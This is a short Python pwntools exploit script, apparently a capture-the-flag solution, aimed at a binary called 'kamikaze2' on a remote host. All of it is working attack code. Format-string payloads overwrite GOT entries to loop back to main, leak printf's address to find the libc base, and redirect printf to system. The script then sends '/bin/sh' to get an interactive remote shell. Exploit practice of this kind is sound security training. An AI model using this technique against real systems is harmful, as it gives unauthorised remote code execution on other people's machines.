from pwn import *


libc = ELF('libc-2.27.so')
e = ELF('kamikaze2')

# context.terminal = ['termite', '-e']
# p = gdb.debug('./kamikaze2')
# p = process('kamikaze2')
p = remote('13.53.125.206', 50000)

main = 0x084207fb
format_string = fmtstr_payload(8, {e.got['exit']: main}, numbwritten=2)

print p.recvuntil(': ')
p.sendline('AA' + format_string)

print p.recvuntil(': ')
p.sendline('AA' + p32(e.got['printf']) + '%8$s')
p.recv(6)

printf = u32(p.recv(4))

print hex(printf)

libc_base = printf - libc.symbols['printf']
system = libc_base + libc.symbols['system']

format_string = fmtstr_payload(8, {e.got['printf']: system}, numbwritten=2)

print p.recvuntil(': ')
p.sendline('AA' + format_string)

print p.recvuntil(': ')
p.sendline('/bin/sh')

p.interactive()